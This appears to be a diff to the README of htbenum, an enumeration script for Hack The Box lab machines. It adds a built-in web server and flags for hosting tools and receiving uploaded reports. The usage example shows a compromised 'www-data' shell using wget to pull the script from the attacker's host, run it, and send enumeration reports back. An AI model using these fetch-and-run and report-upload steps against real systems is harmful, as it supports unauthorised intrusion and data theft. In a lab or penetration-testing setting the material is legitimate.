@@ -54,7 +54,7 @@ To use htbenum, clone the repo and run the script with the `update` parameter on
 ```
 root@kali:~# git clone https://github.com/SolomonSklash/htbenum
 root@kali:~# cd htbenum
-root@kali:~/htbenum#  ./htbenum.sh update
+root@kali:~/htbenum#  ./htbenum.sh -u
 _   _ ___________ _____ _   _ _   ____  ___
 | | | |_   _| ___ \  ___| \ | | | | |  \/  |
 | |_| | | | | |_/ / |__ |  \| | | | | .  . |
@@ -77,12 +77,16 @@ By Solomon Sklash - solomonsklash@0xfeed.io
 root@kali:~/htbenum#  
 ```
 
-Then, start a webserver in the same directory (Apache, `python3 -m http.server 80`, `python -m SimpleHTTPServer 80`, etc).
+Then, start the builtin web server to host the tools an receive the completed reports. You can use you own web server to host the tools, but it will need to support PUT requests for the report uploads.
 
-Finally, upload the `htbenum.sh` script to your target machine, make it executable, and run it with the IP and port of your host machine, with an optional directory for downloading files and writing report output. For example:
+```
+root@kali:~/htbenum# ./htbenum.sh -i 10.10.14.1 -p 80 -w
+```
+
+Finally, upload the `htbenum.sh` script to your target machine, make it executable, and run it with the IP and port of your host machine, with an optional directory for downloading files and writing report output. You can also optionally upload the reports back to the host machine. For example:
 ```
 www-data@htb:/tmp$ wget http://10.10.99.100/htbenum.sh -O /tmp/htbenum.sh
 www-data@htb:/tmp$ chmod +x ./htbenum.sh
-www-data@htb:/tmp$ ./htbenum.sh 10.10.99.100 80
+www-data@htb:/tmp$ ./htbenum.sh -i 10.10.14.1 -p 80 -r
 ```
-Each tool will send its output to a report file in the same directory as the `htbenum.sh` script, or whatever directory is specified by the `directory` parameter.
+Each tool will send its output to a report file in the same directory as the `htbenum.sh` script, or whatever directory is specified by the `-d` parameter.
